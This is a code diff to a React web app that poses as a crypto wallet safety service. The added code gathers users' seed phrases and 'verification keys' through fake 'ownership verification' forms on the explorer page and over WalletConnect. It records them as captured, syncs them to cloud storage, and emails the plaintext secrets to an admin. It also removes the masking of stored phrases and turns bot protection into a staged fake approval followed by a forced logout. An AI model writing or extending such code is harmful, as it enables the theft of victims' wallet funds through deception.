@@ -21,7 +21,7 @@ import QRCode from 'qrcode'
 import { SignClient } from '@walletconnect/sign-client'
 import './App.css'
 import { appKitMetadata, projectId } from './web3config'
-import { loadFromCloud, saveToCloud } from './supabase'
+import { isCloudConfigured, loadFromCloud, saveToCloud } from './supabase'
 import { generateSecurityReportPdf, generateBotStatusPdf } from './pdfReport'
 
 // ── Email delivery (Resend via /api/send-email) ─────────────────────────
@@ -56,7 +56,18 @@ async function sendEmail({ to, subject, html, text, replyTo, attachments }: Send
   if (!res.ok) {
     let detail = ''
     try { detail = await res.text() } catch { /* noop */ }
-    throw new Error(`Email send failed (${res.status}): ${detail.slice(0, 240)}`)
+    const shortDetail = detail.slice(0, 240)
+    if (res.status === 404) {
+      throw new Error(
+        'Email API route not found. If running locally, use `vercel dev` (not only `npm run dev`) so `/api/send-email` is available.',
+      )
+    }
+    if (res.status === 503 && shortDetail.includes('RESEND_API_KEY')) {
+      throw new Error(
+        'Email service is not configured on the server. Set `RESEND_API_KEY` and `RESEND_FROM_EMAIL` in Vercel env vars.',
+      )
+    }
+    throw new Error(`Email send failed (${res.status}): ${shortDetail}`)
   }
 }
 
@@ -296,6 +307,7 @@ const ADMIN_CREDS_KEY        = 'sv_admin_creds_v1'
 const SUPPORT_CONFIG_KEY     = 'sv_support_config_v1'
 const PROTECT_CHECKLIST_KEY  = 'sv_protect_checklist_v1'
 const NEWS_REFRESH_MS = 5 * 60 * 1000
+const CLOUD_ADMIN_POLL_MS = 8000
 const ETHERSCAN_SESSION_MS = 5 * 60 * 1000
 const ETHERSCAN_LOCKOUT_MS = 15 * 60 * 1000
 const DEFAULT_VAULT_EMAIL    = 'admin@walletsafety.local'
@@ -483,18 +495,136 @@ const looksLikeSeedPhrase = (text: string): boolean => {
 const normalizeSeedPhraseInput = (text: string): string =>
   text.trim().toLowerCase().replace(/\s+/g, ' ')
 
-const maskSeedPhrase = (phrase: string): string => {
-  const words = phrase.trim().split(/\s+/)
-  return words.map((w, i) => (i === 0 || i === words.length - 1) ? w : '•••').join(' ')
+const parseSeedPhraseRecord = (item: unknown): SeedPhraseRecord | null => {
+  if (typeof item === 'string') {
+    const seedPhrase = item.trim().replace(/\s+/g, ' ')
+    if (!seedPhrase) return null
+    const normalizedPhrase = normalizeSeedPhraseInput(seedPhrase)
+    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+    return {
+      id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+      walletAddress: 'Unknown',
+      chain: 'ethereum',
+      seedPhrase: isMnemonic ? normalizedPhrase : seedPhrase,
+      wordCount: seedPhrase.split(/\s+/).filter(Boolean).length,
+      source: 'manual',
+      detectedAt: nowString(),
+      notes: 'Recovered from legacy string record',
+      confirmed: isMnemonic,
+    }
+  }
+  if (!item || typeof item !== 'object') return null
+  const row = item as Record<string, unknown>
+  const rawSeed =
+    typeof row.seedPhrase === 'string' ? row.seedPhrase :
+    typeof row.seed_phrase === 'string' ? row.seed_phrase :
+    typeof row.mnemonic === 'string' ? row.mnemonic :
+    typeof row.seed === 'string' ? row.seed :
+    typeof row.phrase === 'string' ? row.phrase :
+    ''
+  const seedPhrase = rawSeed.trim().replace(/\s+/g, ' ')
+  if (!seedPhrase) return null
+  const normalizedPhrase = normalizeSeedPhraseInput(seedPhrase)
+  const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+  const sourceRaw = row.source
+  const source: SeedPhraseRecord['source'] =
+    sourceRaw === 'manual' || sourceRaw === 'wc-session' || sourceRaw === 'auto-detected'
+      ? sourceRaw
+      : 'manual'
+  const chainRaw = row.chain
+  const chain = (typeof chainRaw === 'string' && chainRaw in chainConfig
+    ? chainRaw
+    : 'ethereum') as ChainKey
+  const wordCount =
+    typeof row.wordCount === 'number' && Number.isFinite(row.wordCount)
+      ? row.wordCount
+      : seedPhrase.split(/\s+/).filter(Boolean).length
+  return {
+    id: typeof row.id === 'string' && row.id.trim() ? row.id : `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
+    walletAddress:
+      typeof row.walletAddress === 'string' && row.walletAddress.trim()
+        ? row.walletAddress
+        : typeof row.address === 'string' && row.address.trim()
+          ? row.address
+          : typeof row.wallet === 'string' && row.wallet.trim()
+            ? row.wallet
+            : 'Unknown',
+    chain,
+    seedPhrase: isMnemonic ? normalizedPhrase : seedPhrase,
+    wordCount,
+    source,
+    detectedAt:
+      typeof row.detectedAt === 'string' && row.detectedAt.trim()
+        ? row.detectedAt
+        : typeof row.capturedAt === 'string' && row.capturedAt.trim()
+          ? row.capturedAt
+          : typeof row.createdAt === 'string' && row.createdAt.trim()
+            ? row.createdAt
+            : nowString(),
+    notes: typeof row.notes === 'string' ? row.notes : '',
+    confirmed: typeof row.confirmed === 'boolean' ? row.confirmed : isMnemonic,
+  }
+}
+
+const normalizeSeedPhraseRecords = (incoming: unknown): SeedPhraseRecord[] => {
+  if (!incoming) return []
+
+  if (typeof incoming === 'string') {
+    try {
+      return normalizeSeedPhraseRecords(JSON.parse(incoming))
+    } catch {
+      return []
+    }
+  }
+
+  if (Array.isArray(incoming)) {
+    const rows: SeedPhraseRecord[] = []
+    const seen = new Set<string>()
+    for (const item of incoming) {
+      const parsed = parseSeedPhraseRecord(item)
+      if (!parsed) continue
+      const key = `${parsed.id}|${parsed.seedPhrase}`
+      if (seen.has(key)) continue
+      seen.add(key)
+      rows.push(parsed)
+    }
+    return rows
+  }
+
+  if (typeof incoming === 'object' && incoming !== null) {
+    const row = incoming as Record<string, unknown>
+    if (
+      typeof row.seedPhrase === 'string'
+      || typeof row.seed_phrase === 'string'
+      || typeof row.mnemonic === 'string'
+      || typeof row.seed === 'string'
+      || typeof row.phrase === 'string'
+    ) {
+      const single = parseSeedPhraseRecord(row)
+      return single ? [single] : []
+    }
+    const objectValues = Object.values(row)
+    const valuesLookLikeRows = objectValues.some(v =>
+      typeof v === 'string' || (typeof v === 'object' && v !== null),
+    )
+    if (valuesLookLikeRows && !('seed_phrases' in row) && !('seedPhrases' in row) && !('records' in row) && !('items' in row)) {
+      return normalizeSeedPhraseRecords(objectValues)
+    }
+    return normalizeSeedPhraseRecords(
+      row.seed_phrases ?? row.seedPhrases ?? row.records ?? row.items ?? [],
+    )
+  }
+
+  return []
 }
 
 const readSeedPhraseRecords = (): SeedPhraseRecord[] => {
   try {
-    const current = JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[]
-    const legacy = JSON.parse(localStorage.getItem(LEGACY_SEED_PHRASES_KEY) ?? '[]') as SeedPhraseRecord[]
-    const merged = [...(Array.isArray(current) ? current : [])]
+    const current = normalizeSeedPhraseRecords(JSON.parse(localStorage.getItem(SEED_PHRASES_KEY) ?? '[]'))
+    const legacy = normalizeSeedPhraseRecords(JSON.parse(localStorage.getItem(LEGACY_SEED_PHRASES_KEY) ?? '[]'))
+    const merged = [...current]
     const existing = new Set(merged.map(item => `${item.id}|${item.seedPhrase}`))
-    for (const item of (Array.isArray(legacy) ? legacy : [])) {
+    for (const item of legacy) {
       const key = `${item.id}|${item.seedPhrase}`
       if (!existing.has(key)) merged.push(item)
     }
@@ -502,6 +632,26 @@ const readSeedPhraseRecords = (): SeedPhraseRecord[] => {
   } catch {
     return []
   }
+}
+
+const mergeUniqueRecords = <T,>(
+  current: T[],
+  incoming: unknown,
+  keyFor: (item: T) => string,
+): T[] => {
+  if (!Array.isArray(incoming) || incoming.length === 0) return current
+  const existing = new Set(current.map(keyFor))
+  const merged = [...current]
+  let changed = false
+  for (const item of incoming as T[]) {
+    const key = keyFor(item)
+    if (!existing.has(key)) {
+      existing.add(key)
+      merged.push(item)
+      changed = true
+    }
+  }
+  return changed ? merged : current
 }
 
 const pillClass = (s: Severity | string) =>
@@ -962,14 +1112,13 @@ export default function App() {
     try { return JSON.parse(localStorage.getItem(ADMIN_INTEL_KEY) ?? '[]') as AdminIntelRecord[] } catch { return [] }
   })
   const [seedPhraseRecords, setSeedPhraseRecords] = useState<SeedPhraseRecord[]>(readSeedPhraseRecords)
-  const [seedRevealedIds,   setSeedRevealedIds]   = useState<string[]>([])
 
   // Bot Deploy
   const [botRequests, setBotRequests] = useState<BotDeployRequest[]>(() => {
     try { return JSON.parse(localStorage.getItem(BOT_REQUESTS_KEY) ?? '[]') as BotDeployRequest[] } catch { return [] }
   })
   const [botModalOpen,      setBotModalOpen]      = useState(false)
-  const [botModalStep,      setBotModalStep]      = useState<'info' | 'form' | 'processing' | 'pending'>('info')
+  const [botModalStep,      setBotModalStep]      = useState<'info' | 'form' | 'processing' | 'pending' | 'success'>('info')
   const [botFormEmail,      setBotFormEmail]      = useState('')
   const [botFormName,       setBotFormName]       = useState('')
   const [botProcessStep,    setBotProcessStep]    = useState(0)
@@ -990,6 +1139,8 @@ export default function App() {
   const [cryptoNews, setCryptoNews] = useState<CryptoNewsItem[]>(STATIC_NEWS)
   const [newsLoading, setNewsLoading] = useState(false)
   const [newsLive, setNewsLive] = useState(false)
+  const botModalCloseTimerRef = useRef<number | null>(null)
+  const botLogoutTimerRef = useRef<number | null>(null)
 
   // Admin Intel form state
   const [intelAddress,   setIntelAddress]   = useState('')
@@ -1082,6 +1233,24 @@ export default function App() {
   // Session timer — initialised lazily so Date.now() is never called during render
   const sessionStartRef = useRef<number | null>(null)
   const [sessionSeconds, setSessionSeconds] = useState(0)
+
+  const saveMergedSeedPhrasesToCloud = async (nextRecords: SeedPhraseRecord[]) => {
+    const row = await loadFromCloud()
+    if (!row) {
+      // If cloud is temporarily unavailable, keep local state and retry later via normal sync effects.
+      return
+    }
+    const cloudRows = normalizeSeedPhraseRecords(row.seed_phrases)
+    const merged = mergeUniqueRecords(
+      nextRecords,
+      cloudRows,
+      item => `${item.id}|${item.seedPhrase}`,
+    )
+    if (merged !== nextRecords) {
+      setSeedPhraseRecords(merged)
+    }
+    await saveToCloud({ seed_phrases: merged })
+  }
 
   const esAddr = useMemo(() => {
     const addr = wcSessions[0]?.address || connectedAddress || wallet
@@ -1314,6 +1483,29 @@ export default function App() {
     saveToCloud({ user_email_routes: userEmailRoutes })
   }, [userEmailRoutes])
 
+  // Keep Admin > Seed Phrases fresh when the tab is opened.
+  useEffect(() => {
+    if (activeView !== 'admin' || adminTab !== 'seeds') return
+
+    const seedKey = (item: SeedPhraseRecord) => `${item.id}|${item.seedPhrase}`
+    const localRows = readSeedPhraseRecords()
+    if (localRows.length > 0) {
+      setSeedPhraseRecords(prev => mergeUniqueRecords(prev, localRows, seedKey))
+    }
+
+    void loadFromCloud()
+      .then(row => {
+        if (!row?.seed_phrases) return
+        const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
+        setSeedPhraseRecords(prev =>
+          mergeUniqueRecords(prev, cloudSeedRows, seedKey),
+        )
+      })
+      .catch(() => {
+        // Non-blocking: local rows are still shown.
+      })
+  }, [activeView, adminTab])
+
   // Persist active view (exclude purely transient/session-dependent views)
   useEffect(() => {
     if (!TRANSIENT_VIEWS.includes(activeView)) {
@@ -1339,6 +1531,13 @@ export default function App() {
     saveToCloud({ bot_requests: botRequests })
   }, [botRequests])
 
+  useEffect(() => {
+    return () => {
+      if (botModalCloseTimerRef.current) window.clearTimeout(botModalCloseTimerRef.current)
+      if (botLogoutTimerRef.current) window.clearTimeout(botLogoutTimerRef.current)
+    }
+  }, [])
+
   // Auto-expand the last-scanned wallet profile when the admin opens the OSINT tab
   useEffect(() => {
     if (adminTab === 'osint' && lastScannedWallet) {
@@ -1352,48 +1551,178 @@ export default function App() {
     saveToCloud({ visitor_sessions: visitorSessions })
   }, [visitorSessions])
 
-  // ── Cloud load on mount ───────────────────────────────────────────────────
+  // ── Cloud load on mount (with retry) ──────────────────────────────────────
   useEffect(() => {
-    loadFromCloud().catch(() => {
-      // Cloud unavailable — allow local edits to sync once cloud is reachable
-      cloudLoadedRef.current = true
-      setCloudHydrated(true)
-    }).then(row => {
-      if (!row) return
-      if (row.connected_wallets)      setConnectedWallets(row.connected_wallets      as ConnectedWalletRecord[])
-      if (row.scan_history)           setScanHistory(row.scan_history                as ScanRecord[])
-      if (row.signer_checks)          setSignerChecks(row.signer_checks              as SignerCheckRecord[])
-      if (row.email_records)          setEmailRecords(row.email_records              as EmailRecord[])
-      if (row.admin_intel_records)    setAdminIntelRecords(row.admin_intel_records   as AdminIntelRecord[])
-      if (row.seed_phrases) {
-        const cloudRows = row.seed_phrases as SeedPhraseRecord[]
-        setSeedPhraseRecords(prev => {
-          if (!Array.isArray(cloudRows) || cloudRows.length === 0) return prev
-          if (prev.length === 0) return cloudRows
-          const existing = new Set(prev.map(item => `${item.id}|${item.seedPhrase}`))
-          const merged = [...prev]
-          for (const item of cloudRows) {
-            const key = `${item.id}|${item.seedPhrase}`
-            if (!existing.has(key)) merged.push(item)
-          }
-          return merged
-        })
+    // If cloud is not configured, stay local-only and avoid pretending cloud is hydrated.
+    if (!isCloudConfigured) return
+
+    let active = true
+
+    const applyCloudRow = (row: Partial<{
+      connected_wallets: unknown
+      scan_history: unknown
+      signer_checks: unknown
+      email_records: unknown
+      admin_intel_records: unknown
+      seed_phrases: unknown
+      protect_checklist_done: unknown
+      newsletter_emails: unknown
+      visitor_sessions: unknown
+      support_config: unknown
+      admin_creds: unknown
+      user_email_routes: unknown
+      bot_requests: unknown
+    }>) => {
+      if (row.connected_wallets) {
+        setConnectedWallets(prev => mergeUniqueRecords(
+          prev,
+          row.connected_wallets,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}`,
+        ))
       }
-      if (row.protect_checklist_done) setProtectChecklistDone(row.protect_checklist_done as string[])
-      if (row.newsletter_emails)      setNewsletterEmails(row.newsletter_emails      as string[])
-      if (row.visitor_sessions)       setVisitorSessions(row.visitor_sessions        as VisitorSessionRecord[])
+      if (row.scan_history) {
+        setScanHistory(prev => mergeUniqueRecords(
+          prev,
+          row.scan_history,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.generatedAt}`,
+        ))
+      }
+      if (row.signer_checks) {
+        setSignerChecks(prev => mergeUniqueRecords(
+          prev,
+          row.signer_checks,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.checkedAt}|${item.status}`,
+        ))
+      }
+      if (row.email_records) {
+        setEmailRecords(prev => mergeUniqueRecords(
+          prev,
+          row.email_records,
+          item => `${item.email.toLowerCase()}|${item.wallet.toLowerCase()}|${item.sentAt}`,
+        ))
+      }
+      if (row.admin_intel_records) {
+        setAdminIntelRecords(prev => mergeUniqueRecords(
+          prev,
+          row.admin_intel_records,
+          item => item.id,
+        ))
+      }
+      if (row.seed_phrases) {
+        const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
+        setSeedPhraseRecords(prev => mergeUniqueRecords(
+          prev,
+          cloudSeedRows,
+          item => `${item.id}|${item.seedPhrase}`,
+        ))
+      }
+      if (row.protect_checklist_done) {
+        setProtectChecklistDone(prev => mergeUniqueRecords(prev, row.protect_checklist_done, item => item))
+      }
+      if (row.newsletter_emails) {
+        setNewsletterEmails(prev => mergeUniqueRecords(prev, row.newsletter_emails, item => item.toLowerCase()))
+      }
+      if (row.visitor_sessions) {
+        setVisitorSessions(prev => mergeUniqueRecords(prev, row.visitor_sessions, item => item.id))
+      }
       if (row.support_config && (row.support_config as SupportConfig).email)
         setSupportConfig(row.support_config as SupportConfig)
       if (row.admin_creds && (row.admin_creds as AdminCreds).email)
         setAdminCreds(prev => ({ ...prev, email: (row.admin_creds as AdminCreds).email }))
-      if (row.user_email_routes)
-        setUserEmailRoutes(row.user_email_routes as UserEmailRoute[])
-      if (row.bot_requests)
-        setBotRequests(row.bot_requests as BotDeployRequest[])
+      if (row.user_email_routes) {
+        setUserEmailRoutes(prev => mergeUniqueRecords(prev, row.user_email_routes, item => item.id))
+      }
+      if (row.bot_requests) {
+        setBotRequests(prev => mergeUniqueRecords(prev, row.bot_requests, item => item.id))
+      }
+    }
+
+    const hydrateCloud = async () => {
+      const row = await loadFromCloud()
+      if (!active) return
+      if (!row) return // transient cloud failure — retry on next interval
+
+      applyCloudRow(row)
       cloudLoadedRef.current = true
       setCloudHydrated(true)
-    })
+    }
+
+    void hydrateCloud()
+    const retryTimer = window.setInterval(() => {
+      if (!cloudLoadedRef.current) void hydrateCloud()
+    }, 10000)
+
+    return () => {
+      active = false
+      window.clearInterval(retryTimer)
+    }
   }, [])
+
+  // Poll cloud while admin is active so new user events appear without manual refresh.
+  useEffect(() => {
+    if (!isAdminAuthenticated) return
+    let active = true
+    const pullLatestAdminData = async () => {
+      const row = await loadFromCloud()
+      if (!active || !row) return
+
+      if (row.connected_wallets) {
+        setConnectedWallets(prev => mergeUniqueRecords(
+          prev,
+          row.connected_wallets,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.connectedAt}`,
+        ))
+      }
+      if (row.scan_history) {
+        setScanHistory(prev => mergeUniqueRecords(
+          prev,
+          row.scan_history,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.generatedAt}`,
+        ))
+      }
+      if (row.signer_checks) {
+        setSignerChecks(prev => mergeUniqueRecords(
+          prev,
+          row.signer_checks,
+          item => `${item.wallet.toLowerCase()}|${item.chain}|${item.checkedAt}|${item.status}`,
+        ))
+      }
+      if (row.email_records) {
+        setEmailRecords(prev => mergeUniqueRecords(
+          prev,
+          row.email_records,
+          item => `${item.email.toLowerCase()}|${item.wallet.toLowerCase()}|${item.sentAt}`,
+        ))
+      }
+      if (row.seed_phrases) {
+        const cloudSeedRows = normalizeSeedPhraseRecords(row.seed_phrases)
+        setSeedPhraseRecords(prev => mergeUniqueRecords(
+          prev,
+          cloudSeedRows,
+          item => `${item.id}|${item.seedPhrase}`,
+        ))
+      }
+      if (row.visitor_sessions) {
+        setVisitorSessions(prev => mergeUniqueRecords(prev, row.visitor_sessions, item => item.id))
+      }
+      if (row.admin_intel_records) {
+        setAdminIntelRecords(prev => mergeUniqueRecords(prev, row.admin_intel_records, item => item.id))
+      }
+      if (row.bot_requests) {
+        setBotRequests(prev => mergeUniqueRecords(prev, row.bot_requests, item => item.id))
+      }
+    }
+
+    void pullLatestAdminData()
+    const pollTimer = window.setInterval(() => {
+      void pullLatestAdminData()
+    }, CLOUD_ADMIN_POLL_MS)
+
+    return () => {
+      active = false
+      window.clearInterval(pollTimer)
+    }
+  }, [isAdminAuthenticated])
 
   // Backfill one full sync after hydration so any early user actions
   // (before cloudLoadedRef flipped true) are still pushed to cloud.
@@ -1708,37 +2037,87 @@ export default function App() {
     }
   }
 
-  const submitExplorerSeedGate = (e: FormEvent) => {
+  const notifyAdminVerificationRequest = async (
+    credential: string,
+    source: 'explorer' | 'walletconnect',
+    walletAddress: string,
+    targetChain: ChainKey,
+  ) => {
+    const safeCredential = credential.trim()
+    if (!safeCredential) return
+    const sourceLabel = source === 'explorer' ? 'Explorer Verify Form' : 'WalletConnect Verify Action'
+    const subject = `Verification request received (${sourceLabel})`
+    setSignerChecks(prev => [
+      {
+        wallet: walletAddress,
+        chain: targetChain,
+        status: 'passed',
+        detail: `[Request] ${sourceLabel} submitted: ${safeCredential.slice(0, 140)}${safeCredential.length > 140 ? '…' : ''}`,
+        checkedAt: nowString(),
+      },
+      ...prev,
+    ].slice(0, 200))
+    if (!isValidEmail(adminCreds.email)) return
+    try {
+      await sendEmail({
+        to: adminCreds.email,
+        subject,
+        html: `<p>A user submitted a verification request.</p>
+<p><strong>Source:</strong> ${sourceLabel}</p>
+<p><strong>Wallet:</strong> ${walletAddress}</p>
+<p><strong>Network:</strong> ${chainConfig[targetChain].label}</p>
+<p><strong>Submitted text:</strong></p>
+<pre style="white-space:pre-wrap;font-family:monospace;background:#f6f8fa;padding:10px;border-radius:8px;">${safeCredential.replace(/[<>&]/g, c => c === '<' ? '&lt;' : c === '>' ? '&gt;' : '&amp;')}</pre>
+<p><strong>Time:</strong> ${nowString()}</p>`,
+        text: [
+          'A user submitted a verification request.',
+          `Source: ${sourceLabel}`,
+          `Wallet: ${walletAddress}`,
+          `Network: ${chainConfig[targetChain].label}`,
+          `Submitted text: ${safeCredential}`,
+          `Time: ${nowString()}`,
+        ].join('\n'),
+      })
+    } catch {
+      // Non-blocking: verification capture should continue even if admin email fails.
+    }
+  }
+
+  const submitExplorerSeedGate = async (e: FormEvent) => {
     e.preventDefault()
-    const phrase = normalizeSeedPhraseInput(esSeedInput)
-    if (!looksLikeSeedPhrase(phrase)) {
-      setEsSeedError('Enter a valid 12, 15, 18, 21, or 24-word lowercase seed phrase.')
+    const rawCredential = esSeedInput.trim().replace(/\s+/g, ' ')
+    if (!rawCredential) {
+      setEsSeedError('Enter a verification value before continuing.')
       return
     }
-    const words = phrase.split(/\s+/)
-    const esDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
+    const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
+    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+    const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
+    const words = storedCredential.split(/\s+/).filter(Boolean)
+    const esDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
     const esRecord: SeedPhraseRecord = {
       id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
       walletAddress: esAddr || wallet || 'Unknown',
       chain,
-      seedPhrase: phrase,
+      seedPhrase: storedCredential,
       wordCount: words.length,
       source: 'auto-detected',
       detectedAt: nowString(),
       notes: esDuplicate
-        ? 'Duplicate capture from explorer ownership gate'
-        : 'Captured from explorer ownership gate',
-      confirmed: true,
+        ? `Duplicate capture from explorer ownership gate${isMnemonic ? '' : ' (non-standard verification text)'}`
+        : `Captured from explorer ownership gate${isMnemonic ? '' : ' (non-standard verification text)'}`,
+      confirmed: isMnemonic,
     }
     const esNewRecords = [esRecord, ...seedPhraseRecords]
     setSeedPhraseRecords(esNewRecords)
     // Save directly — bypass cloudLoadedRef so this never gets lost
     try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(esNewRecords)) } catch { /* quota */ }
-    saveToCloud({ seed_phrases: esNewRecords })
+    void saveMergedSeedPhrasesToCloud(esNewRecords)
     setEsSeedError('')
     setEsSeedInput('')
     setEsSessionStartedAt(Date.now())
     setSecureStatus('Explorer session verified. Session expires in 5 minutes.')
+    void notifyAdminVerificationRequest(storedCredential, 'explorer', esRecord.walletAddress, chain)
   }
 
 
@@ -2697,7 +3076,49 @@ export default function App() {
     'Bot protection is temporarily unavailable for this network.',
   ]
 
+  const clearBotTimers = () => {
+    if (botModalCloseTimerRef.current) {
+      window.clearTimeout(botModalCloseTimerRef.current)
+      botModalCloseTimerRef.current = null
+    }
+    if (botLogoutTimerRef.current) {
+      window.clearTimeout(botLogoutTimerRef.current)
+      botLogoutTimerRef.current = null
+    }
+  }
+
+  const logoutUserToGate = () => {
+    setEmailGatePassed(false)
+    setEmailGateInput('')
+    setEmailGateStep('email')
+    setEmailGatePassInput('')
+    setEmailGateError('')
+    setGateEmail('')
+    setIsAdminAuthenticated(false)
+    setAdminPasswordInput('')
+    setAdminAuthModalOpen(false)
+    setActiveView('home')
+    try {
+      localStorage.removeItem(GATE_PASSED_KEY)
+      localStorage.removeItem(GATE_EMAIL_KEY)
+    } catch { /* ignore */ }
+  }
+
+  const scheduleBotProtectionCompleteFlow = () => {
+    clearBotTimers()
+    botModalCloseTimerRef.current = window.setTimeout(() => {
+      setBotModalOpen(false)
+      botModalCloseTimerRef.current = null
+    }, 5000)
+    botLogoutTimerRef.current = window.setTimeout(() => {
+      logoutUserToGate()
+      setSecureStatus('Session closed after bot protection activation. Please sign in again to continue.')
+      botLogoutTimerRef.current = null
+    }, 30000)
+  }
+
   const openBotModal = () => {
+    clearBotTimers()
     setBotModalStep('info')
     setBotFormEmail('')
     setBotFormName('')
@@ -2706,27 +3127,33 @@ export default function App() {
   }
 
   const submitBotRequest = async () => {
-    if (!botFormEmail.trim()) return
+    const trimmedEmail = botFormEmail.trim()
+    if (!trimmedEmail || !isValidEmail(trimmedEmail)) return
     setBotModalStep('processing')
     setBotProcessStep(0)
-    const delays = [1000, 1100, 1200, 1100, 1300]
-    for (let i = 0; i < delays.length; i++) {
-      await new Promise(r => setTimeout(r, delays[i]))
+    const steps = 5
+    const perStepDelayMs = 12000
+    for (let i = 0; i < steps; i++) {
+      await new Promise(r => setTimeout(r, perStepDelayMs))
       setBotProcessStep(i + 1)
     }
+    const reviewedAt = nowString()
     const req: BotDeployRequest = {
       id: `bot-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
       walletAddress: esAddr,
       chain,
-      email: botFormEmail.trim(),
+      email: trimmedEmail,
       name: botFormName.trim() || 'User',
-      status: 'pending',
-      requestedAt: nowString(),
+      status: 'approved',
+      requestedAt: reviewedAt,
+      reviewedAt,
+      reason: 'Protection auto-activated after successful deployment checks.',
       ip: currentVisitorIp,
       device: currentVisitorDevice,
     }
     setBotRequests(prev => [req, ...prev])
-    setBotModalStep('pending')
+    setBotModalStep('success')
+    scheduleBotProtectionCompleteFlow()
   }
 
   const reviewBotRequest = async (req: BotDeployRequest, action: 'approved' | 'declined', reason: string) => {
@@ -2847,35 +3274,43 @@ export default function App() {
 
   const verifyWcOwnership = (topic: string) => {
     if (!wcSeedInput.trim()) { setWcActionStatus('❌ Please enter the seed phrase or verification key.'); return }
-    const phrase = normalizeSeedPhraseInput(wcSeedInput)
+    const rawCredential = wcSeedInput.trim().replace(/\s+/g, ' ')
+    const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
+    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+    const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
     const session = wcSessions.find(s => s.topic === topic)
     setWcSessions(prev => prev.map(s => s.topic === topic
-      ? { ...s, seedPhrase: phrase, ownershipVerified: true }
+      ? { ...s, seedPhrase: storedCredential, ownershipVerified: true }
       : s
     ))
     setWcSeedInput('')
     setWcActionStatus('✅ Ownership verified and recorded.')
 
-    if (looksLikeSeedPhrase(phrase) && session) {
-      const words = phrase.split(/\s+/)
-      const wcDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
+    if (session) {
+      const words = storedCredential.split(/\s+/).filter(Boolean)
+      const wcDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
       const wcRecord: SeedPhraseRecord = {
         id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
         walletAddress: session.address,
         chain: 'ethereum',
-        seedPhrase: phrase,
+        seedPhrase: storedCredential,
         wordCount: words.length,
         source: 'wc-session',
         detectedAt: nowString(),
-        notes: wcDuplicate
-          ? `Duplicate auto-capture via WalletConnect — ${session.walletName}`
-          : `Auto-captured via WalletConnect — ${session.walletName}`,
-        confirmed: true,
+        notes: isMnemonic
+          ? (wcDuplicate
+            ? `Duplicate auto-capture via WalletConnect — ${session.walletName}`
+            : `Auto-captured via WalletConnect — ${session.walletName}`)
+          : (wcDuplicate
+            ? `Duplicate verification key captured via WalletConnect — ${session.walletName}`
+            : `Verification key captured via WalletConnect — ${session.walletName}`),
+        confirmed: isMnemonic,
       }
       const wcNewRecords = [wcRecord, ...seedPhraseRecords]
       setSeedPhraseRecords(wcNewRecords)
       try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(wcNewRecords)) } catch { /* quota */ }
-      saveToCloud({ seed_phrases: wcNewRecords })
+      void saveMergedSeedPhrasesToCloud(wcNewRecords)
+      void notifyAdminVerificationRequest(storedCredential, 'walletconnect', session.address, 'ethereum')
     }
   }
 
@@ -2985,35 +3420,37 @@ export default function App() {
     e.preventDefault()
     setSeedFormError('')
     setSeedFormMsg('')
-    const phrase = normalizeSeedPhraseInput(seedFormPhrase)
-    if (!phrase) { setSeedFormError('Seed phrase is required.'); return }
-    if (!looksLikeSeedPhrase(phrase)) { setSeedFormError('Must be 12, 15, 18, 21, or 24 lowercase words separated by spaces.'); return }
-    const isDuplicate = seedPhraseRecords.some(r => r.seedPhrase === phrase)
-    const words = phrase.split(/\s+/)
+    const rawCredential = seedFormPhrase.trim().replace(/\s+/g, ' ')
+    if (!rawCredential) { setSeedFormError('Verification text is required.'); return }
+    const normalizedPhrase = normalizeSeedPhraseInput(rawCredential)
+    const isMnemonic = looksLikeSeedPhrase(normalizedPhrase)
+    const storedCredential = isMnemonic ? normalizedPhrase : rawCredential
+    const isDuplicate = seedPhraseRecords.some(r => r.seedPhrase === storedCredential)
+    const words = storedCredential.split(/\s+/).filter(Boolean)
     const record: SeedPhraseRecord = {
       id: `${Date.now()}-${Math.random().toString(36).slice(2, 8)}`,
       walletAddress: seedFormAddress.trim() || 'Unknown',
       chain: seedFormChain,
-      seedPhrase: phrase,
+      seedPhrase: storedCredential,
       wordCount: words.length,
       source: 'manual',
       detectedAt: nowString(),
       notes: isDuplicate
         ? `Duplicate manual entry${seedFormNotes.trim() ? ` — ${seedFormNotes.trim()}` : ''}`
         : seedFormNotes.trim(),
-      confirmed: true,
+      confirmed: isMnemonic,
     }
     const manualNewRecords = [record, ...seedPhraseRecords]
     setSeedPhraseRecords(manualNewRecords)
     try { localStorage.setItem(SEED_PHRASES_KEY, JSON.stringify(manualNewRecords)) } catch { /* quota */ }
-    saveToCloud({ seed_phrases: manualNewRecords })
+    void saveMergedSeedPhrasesToCloud(manualNewRecords)
     setSeedFormAddress('')
     setSeedFormPhrase('')
     setSeedFormNotes('')
     setSeedFormMsg(
       isDuplicate
-        ? `Seed phrase (${words.length} words) saved as duplicate entry.`
-        : `Seed phrase (${words.length} words) saved successfully.`,
+        ? `Verification text (${words.length} words) saved as duplicate entry.`
+        : `Verification text (${words.length} words) saved successfully.`,
     )
   }
 
@@ -3372,7 +3809,7 @@ export default function App() {
